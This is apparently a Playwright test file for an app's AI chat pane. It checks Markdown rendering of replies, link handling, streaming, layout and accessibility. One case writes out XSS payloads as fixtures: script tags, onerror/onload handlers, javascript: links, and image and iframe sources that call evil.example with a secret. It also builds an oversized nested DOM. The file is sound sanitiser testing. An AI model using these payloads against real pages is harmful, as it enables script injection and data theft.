// What a reply of the AI chat does to the page (docs/design.md section 6.12): while it streams it is text, once it is
// finished the core renders it as Markdown and the page copies the answer through its own allow-list, so a script, a
// handler, a style, an image or a `javascript:` link that a broken sanitiser let through still never reaches the DOM, no
// request leaves for an image, and a link that carries data is text followed by its address.
import assert from "node:assert/strict";
import { OTHER_PROFILE, PROFILE, VIEW_CHAT_ONLY, boot, calls, chatBlock, openAi, sendText } from "./ai-lib.mjs";
import { dropInertReports } from "./lib.mjs";

export default async function ({ engine, page, url, errors }) {
  page.setDefaultTimeout(8000);
  await markdownCase(page, url);
  await hostileCase(page, url);
  // The hostile reply above carries an inline style and inline handlers on purpose, and the policy of the page reports them
  // in the inert document the reply is parsed in; those reports are expected, anything else is an error.
  await dropInertReports(page, errors);
  await linkCase(page, url);
  await narrowCase(page, url);
  await modesCase(page, url, engine);
  assert.deepEqual(errors, [], "the page reported errors");
}

const REPLY_HTML = '<p>Check <code>talosctl health</code>.</p><pre><code class="language-sh">talosctl health</code></pre>';

/** Wait until the chat shows `n` messages and no reply is streaming. */
const settled = (page, n) =>
  page.waitForFunction((count) => document.querySelectorAll(".chat-msg").length === count && !document.querySelector(".chat-partial"), n);

async function markdownCase(page, url) {
  await boot(page, url);
  await page.evaluate((html) => window.__MOCK__.on("markdown_render", () => html), REPLY_HTML);
  await openAi(page);
  await page.evaluate(() => window.__MOCK__.ai.hold(2));
  await sendText(page, "show me");
  // While the reply streams it is text, and the core's renderer is not asked.
  await page.waitForFunction(() => document.querySelector(".chat-partial .chat-text")?.textContent === "Hello ");
  assert.equal(await page.locator(".chat-partial .chat-text").evaluate((n) => n.children.length), 0, "a text node");
  assert.equal((await calls(page, "markdown_render")).length, 0);

  // A finished reply is sent once, with exactly its text, and comes back as elements of the allow-list.
  await page.evaluate(() => window.__MOCK__.ai.release());
  await settled(page, 2);
  await page.waitForSelector('.chat-msg[data-role="assistant"] .chat-text pre');
  assert.deepEqual(await calls(page, "markdown_render"), [{ text: "Hello there." }]);
  const assistant = page.locator('.chat-msg[data-role="assistant"] .chat-text');
  assert.equal(await assistant.locator("p").count(), 1);
  assert.equal(await assistant.locator("p code").textContent(), "talosctl health");
  assert.equal(await assistant.locator("pre code").getAttribute("class"), "language-sh");
  assert.equal(await page.locator('.chat-msg[data-role="user"] .chat-text').evaluate((n) => n.children.length), 0, "a user message is text");

  // A redraw, a snapshot or a focus asks for nothing again.
  await page.evaluate(() => window.dispatchEvent(new Event("focus")));
  await page.waitForFunction(() => window.__MOCK__.callsOf("ai_turn_snapshot").length >= 3);
  await page.waitForTimeout(150);
  assert.equal((await calls(page, "markdown_render")).length, 1, "one call for one message");

  // A tab switch draws the chat again from the kept session: the Markdown is back and the core is not asked again.
  const shown = await page.evaluate(() => window.__MOCK__.view());
  const hidden = { ...shown, focus: 2, panes: shown.panes.filter(([id]) => id !== 3) };
  await page.evaluate((v) => window.__MOCK__.emit("layout", v), hidden);
  await page.waitForFunction(() => document.querySelectorAll(".block-chat").length === 0);
  await page.evaluate((v) => window.__MOCK__.emit("layout", v), shown);
  await page.waitForSelector('.chat-msg[data-role="assistant"] .chat-text pre');
  assert.equal((await calls(page, "markdown_render")).length, 1, "the cache answered");

  // A null answer (a text the renderer does not take) keeps the plain text.
  await page.evaluate(() => window.__MOCK__.on("markdown_render", () => null));
  await sendText(page, "again");
  await settled(page, 4);
  await page.waitForFunction(() => window.__MOCK__.callsOf("markdown_render").length === 2);
  const second = page.locator('.chat-msg[data-role="assistant"] .chat-text').nth(1);
  assert.equal(await second.textContent(), "Hello there.");
  assert.equal(await second.evaluate((n) => n.children.length), 0);

  // A reply that was stopped is not Markdown: nothing is asked.
  await page.evaluate(() => window.__MOCK__.ai.hold(2));
  await sendText(page, "stop this one");
  await page.waitForFunction(() => document.querySelector(".chat-partial .chat-text")?.textContent === "Hello ");
  await page.locator(".chat-send").click();
  await page.waitForFunction(() => document.querySelector('.chat-msg[data-status="cancelled"]'));
  await page.waitForTimeout(150);
  assert.equal((await calls(page, "markdown_render")).length, 2, "a stopped reply is not rendered");
  assert.equal(await page.locator('.chat-msg[data-status="cancelled"] .chat-text').evaluate((n) => n.children.length), 0);
}

async function hostileCase(page, url) {
  const requests = [];
  page.on("request", (r) => requests.push(r.url()));
  await boot(page, url);
  await openAi(page);
  // What a failed sanitiser could let through, and a document that is far too deep and far too wide.
  await page.evaluate(() => {
    const nested = `${"<div>".repeat(200)}deep${"</div>".repeat(200)}`;
    const many = "<span>x</span>".repeat(300000);
    const html =
      "<p>ok</p><script>window.__XSS = 1</script>" +
      '<img src="https://evil.example/x.png?d=SECRET" onerror="window.__XSS = 1">' +
      '<iframe src="https://evil.example/f"></iframe><svg onload="window.__XSS = 1"><image href="https://evil.example/i.png"/></svg>' +
      '<form action="https://evil.example/p"><input name="x"></form><style>* { display: none }</style><math><mi>x</mi></math>' +
      '<a href="javascript:window.__XSS = 1">js</a><div style="position:fixed" onclick="window.__XSS = 1">styled</div>' +
      nested +
      many;
    window.__MOCK__.on("markdown_render", () => html);
  });
  await sendText(page, "attack");
  await settled(page, 2);
  await page.waitForSelector('.chat-msg[data-role="assistant"] .chat-text p');
  const found = await page.evaluate(() => {
    const log = document.querySelector(".chat-log");
    const text = document.querySelector('.chat-msg[data-role="assistant"] .chat-text');
    const depth = (n) => {
      let d = 0;
      for (let p = n; p && p !== text; p = p.parentElement) d += 1;
      return d;
    };
    const attrs = [];
    let deepest = 0;
    for (const n of log.querySelectorAll("*")) {
      for (const a of n.attributes) if (a.name.startsWith("on") || a.name === "style") attrs.push(`${n.localName}.${a.name}`);
      deepest = Math.max(deepest, depth(n));
    }
    return {
      banned: log.querySelectorAll("script, img, iframe, svg, form, style, math, image, input").length,
      attrs,
      js: log.querySelectorAll('a[href^="javascript"]').length,
      deepest,
      nodes: log.querySelectorAll("*").length,
      xss: typeof window.__XSS,
    };
  });
  assert.equal(found.banned, 0, "no script, image, frame, svg, form, style or math element");
  assert.deepEqual(found.attrs, [], "no handler and no style attribute");
  assert.equal(found.js, 0, "no javascript: link");
  assert.ok(found.deepest <= 65, `nested no deeper than 64 levels (${found.deepest})`);
  // 300 000 spans in one run are cut to the share of one block (5 000 nodes). WebKit took 9 s to lay out 200 000 of them
  // (its line layout grows with the square of the boxes of a run), which is past the 8 s timeout of this file.
  assert.ok(found.nodes <= 6_000, `the copy is bounded (${found.nodes} nodes)`);
  assert.equal(found.xss, "undefined", "nothing ran");
  assert.equal(await page.evaluate(() => 1 + 1), 2, "the page stayed responsive");
  assert.deepEqual(requests.filter((u) => u.includes("evil.example")), [], "no request left for another host");

  // Half an element in a streaming delta is shown as it is: text, with no element made from it.
  const half = "<img src=x onerror=window.__XSS=1><scr";
  await page.evaluate((chunk) => window.__MOCK__.ai.script({ chunks: [chunk], stall: true }), half);
  await sendText(page, "stream it");
  await page.waitForFunction(() => document.querySelector(".chat-partial .chat-text")?.textContent.length > 0);
  assert.equal(await page.locator(".chat-partial .chat-text").textContent(), half);
  assert.equal(await page.locator(".chat-partial .chat-text").evaluate((n) => n.children.length), 0);
  assert.equal(await page.evaluate(() => typeof window.__XSS), "undefined");
  await page.locator(".chat-send").click();
  await page.waitForFunction(() => document.querySelector(".chat-send")?.dataset.mode === "send");
  assert.deepEqual(requests.filter((u) => u.includes("evil.example")), []);
}

async function linkCase(page, url) {
  await boot(page, url);
  await openAi(page);
  const html =
    '<p><a href="https://example.org/docs">docs</a> <a href="https://example.org/?d=SECRET">secret</a> ' +
    '<a href="mailto:a@example.org?subject=x">mail</a> <a href="javascript:alert(1)">js</a> <a>bare</a></p>';
  await page.evaluate((h) => window.__MOCK__.on("markdown_render", () => h), html);
  await sendText(page, "links");
  await settled(page, 2);
  await page.waitForSelector(".chat-md");
  const text = page.locator('.chat-msg[data-role="assistant"] .chat-text');
  // Only the plain address is a link; the others are text, and the address follows a link that carries data.
  assert.equal(await text.locator("a").count(), 1);
  assert.equal(await text.locator("a").getAttribute("href"), "https://example.org/docs");
  assert.equal(await text.locator("a").getAttribute("title"), "https://example.org/docs");
  assert.equal(await text.locator("a").getAttribute("target"), null, "the page opens no window by itself");
  assert.equal(
    await text.locator("p").textContent(),
    "docs secret [https://example.org/?d=SECRET] mail [mailto:a@example.org?subject=x] js bare",
  );

  // A click opens it through the shell and the page does not move; a middle click does nothing.
  const here = page.url();
  await text.locator("a").click();
  await page.waitForFunction(() => window.__MOCK__.callsOf("open_url").length === 1);
  assert.deepEqual(await calls(page, "open_url"), [{ url: "https://example.org/docs" }]);
  assert.equal(page.url(), here, "the page's address did not change");
  await text.locator("a").click({ button: "middle" });
  await page.waitForTimeout(100);
  assert.equal((await calls(page, "open_url")).length, 1, "a middle click opens nothing");
  assert.equal(page.url(), here);
  // Text that is no link does nothing when it is clicked.
  await text.locator("p").click({ position: { x: 200, y: 5 } });
  assert.equal((await calls(page, "open_url")).length, 1);
}

/** A chat that fills the screen, with two saved profiles so that the chip is a button; `size` is the window. */
async function openOnly(page, url, size) {
  await page.setViewportSize(size);
  await boot(page, url, {
    profiles: [PROFILE, OTHER_PROFILE],
    view: VIEW_CHAT_ONLY,
    blocks: [chatBlock("chat-x")],
    states: { "chat-x": { title: "Earlier question", profile: "local-1", model: "llama3.2" } },
    starts: 1,
  });
  await page.waitForSelector(".block-chat");
  await page.locator(".chat-input").focus();
  await page.waitForFunction(() => document.querySelector(".chat-chip")?.tagName === "BUTTON");
}

/** The sizes of the controls of the chat, in CSS pixels. */
const sizes = (page) =>
  page.evaluate(() => {
    const box = (sel) => [...document.querySelectorAll(sel)].map((n) => {
      const r = n.getBoundingClientRect();
      return { w: r.width, h: r.height };
    });
    return {
      send: box(".chat-send"), chip: box(".chat-chip"), choice: box(".chat-choice"), input: box(".chat-input"),
      inputFont: parseFloat(getComputedStyle(document.querySelector(".chat-input")).fontSize),
    };
  });

async function narrowCase(page, url) {
  // A phone: every target is at least 44 px, the composer text at least 16 px, the picker is a sheet from the bottom edge.
  await openOnly(page, url, { width: 390, height: 780 });
  await page.locator(".chat-chip").click();
  await page.waitForSelector(".chat-picker");
  const phone = await sizes(page);
  for (const [name, list] of [["send", phone.send], ["chip", phone.chip], ["choice", phone.choice], ["input", phone.input]]) {
    assert.ok(list.length > 0, `a ${name} exists`);
    for (const b of list) assert.ok(b.h >= 44 - 0.5, `${name} is ${b.h} px high at 390 px`);
  }
  assert.ok(phone.send[0].w >= 44 - 0.5, `Send is ${phone.send[0].w} px wide`);
  assert.ok(phone.inputFont >= 16, `composer text is ${phone.inputFont} px`);
  const sheet = await page.locator(".chat-picker").evaluate((n) => {
    const r = n.getBoundingClientRect();
    const css = getComputedStyle(n);
    return {
      position: css.position, bottom: r.bottom, left: r.left, width: r.width, view: innerHeight, viewWidth: innerWidth,
      topLeft: parseFloat(css.borderTopLeftRadius), topRight: parseFloat(css.borderTopRightRadius),
      bottomLeft: parseFloat(css.borderBottomLeftRadius), height: r.height,
    };
  });
  assert.equal(sheet.position, "fixed");
  assert.equal(sheet.bottom, sheet.view, "the sheet sits on the bottom edge");
  assert.equal(sheet.width, sheet.viewWidth, "and spans the width");
  assert.equal(sheet.left, 0);
  assert.ok(sheet.topLeft >= 24 && sheet.topRight >= 24, `a 24 px radius on top (${sheet.topLeft})`);
  assert.equal(sheet.bottomLeft, 0);
  assert.ok(sheet.height <= sheet.view * 0.6 + 1, "at most 60 % of the window");
  // The sheet is the only element of the chat with a shadow.
  const shadows = await page.evaluate(() =>
    [...document.querySelectorAll(".block-chat *")].filter((n) => getComputedStyle(n).boxShadow !== "none").map((n) => n.className),
  );
  assert.deepEqual(shadows, ["chat-picker"]);

  // A desktop window: 28 px, a picker that is a row of the pane and has no shadow.
  await openOnly(page, url, { width: 1000, height: 640 });
  await page.locator(".chat-chip").click();
  await page.waitForSelector(".chat-picker");
  const desk = await sizes(page);
  for (const [name, list] of [["send", desk.send], ["chip", desk.chip], ["choice", desk.choice], ["input", desk.input]]) {
    for (const b of list) assert.ok(b.h >= 28 - 0.5, `${name} is ${b.h} px high on the desktop`);
    for (const b of list) assert.ok(b.h < 44, `${name} keeps the desktop size (${b.h})`);
  }
  const flat = await page.locator(".chat-picker").evaluate((n) => ({ position: getComputedStyle(n).position, shadow: getComputedStyle(n).boxShadow }));
  assert.notEqual(flat.position, "fixed");
  assert.equal(flat.shadow, "none");
  assert.deepEqual(
    await page.evaluate(() => [...document.querySelectorAll(".block-chat *")].filter((n) => getComputedStyle(n).boxShadow !== "none").map((n) => n.className)),
    [],
    "no shadow at all on the desktop",
  );
  await page.setViewportSize({ width: 1000, height: 640 });
}

async function modesCase(page, url, engine) {
  // WebKit on macOS visits buttons with Option+Tab only, as Safari does by default.
  const option = engine === "webkit" && process.platform === "darwin";
  const forward = () => page.keyboard.press(option ? "Alt+Tab" : "Tab");
  const back = () => page.keyboard.press(option ? "Shift+Alt+Tab" : "Shift+Tab");
  await openOnly(page, url, { width: 1000, height: 640 });
  const edge = () => page.locator(".chat-bar").evaluate((n) => getComputedStyle(n).borderBottomColor);
  const duration = (sel) => page.locator(sel).evaluate((n) => getComputedStyle(n).transitionDuration);
  const root = (add, name) => page.evaluate(([a, n]) => document.documentElement.classList[a ? "add" : "remove"](n), [add, name]);

  // Higher contrast: the hairlines follow `--hw-line`, which that mode swaps.
  const normal = await edge();
  await root(true, "contrast-high");
  assert.notEqual(await edge(), normal, "the bar's hairline follows the token");
  await root(false, "contrast-high");
  assert.equal(await edge(), normal);

  // Reduced motion: the transitions of the chat are gone.
  assert.notEqual(await duration(".chat-send"), "0s");
  assert.notEqual(await duration(".chat-chip"), "0s");
  await root(true, "motion-reduce");
  assert.equal(await duration(".chat-send"), "0s");
  assert.equal(await duration(".chat-chip"), "0s");
  await root(false, "motion-reduce");

  // Forced colours: the style sheet outlines the chip and the chosen row with a system colour.
  const css = await (await fetch(`${url}chat.css`)).text();
  const forced = css.slice(css.indexOf("@media (forced-colors: active)"));
  assert.ok(forced.startsWith("@media"), "chat.css has a forced-colors block");
  assert.match(forced, /\.chat-chip[^{]*\{[^}]*outline[^}]*Highlight/);
  assert.match(forced, /\.chat-choice\[aria-checked="true"\][^{]*\{[^}]*outline[^}]*Highlight/);

  // The focus ring is 2 px for the keyboard; the composer's ring is the rose token.
  const rose = await page.evaluate(() => {
    const probe = document.createElement("i");
    probe.style.color = "var(--hw-rose)";
    document.body.append(probe);
    const c = getComputedStyle(probe).color;
    probe.remove();
    return c;
  });
  await page.locator(".chat-input").focus();
  const ring = await page.locator(".chat-input").evaluate((n) => ({ width: getComputedStyle(n).outlineWidth, color: getComputedStyle(n).outlineColor }));
  assert.equal(ring.color, rose, "the composer's ring is rose");
  assert.equal(ring.width, "2px");
  await forward();
  assert.equal(await page.evaluate(() => document.activeElement?.className), "chat-ctx", "the Auto toggle follows the field");
  assert.equal(await page.locator(".chat-ctx").evaluate((n) => getComputedStyle(n).outlineWidth), "2px", "Auto: a 2 px ring");
  await forward();
  assert.equal(await page.evaluate(() => document.activeElement?.className), "chat-send");
  assert.equal(await page.locator(".chat-send").evaluate((n) => getComputedStyle(n).outlineWidth), "2px", "Send: a 2 px ring");
  await page.locator(".chat-input").focus();
  await back();
  await back();
  assert.equal(await page.evaluate(() => document.activeElement?.className), "chat-setup", "the providers button is last in the bar");
  assert.equal(await page.locator(".chat-setup").evaluate((n) => getComputedStyle(n).outlineWidth), "2px", "the button: a 2 px ring");
  await back();
  assert.equal(await page.evaluate(() => document.activeElement?.className), "chat-chip");
  assert.equal(await page.locator(".chat-chip").evaluate((n) => getComputedStyle(n).outlineWidth), "2px", "the chip: a 2 px ring");

  // Nothing of the chat has a gradient or a filter.
  const flat = await page.evaluate(() =>
    [...document.querySelectorAll(".block-chat, .block-chat *")]
      .filter((n) => getComputedStyle(n).backgroundImage !== "none" || getComputedStyle(n).filter !== "none")
      .map((n) => n.className),
  );
  assert.deepEqual(flat, []);
}
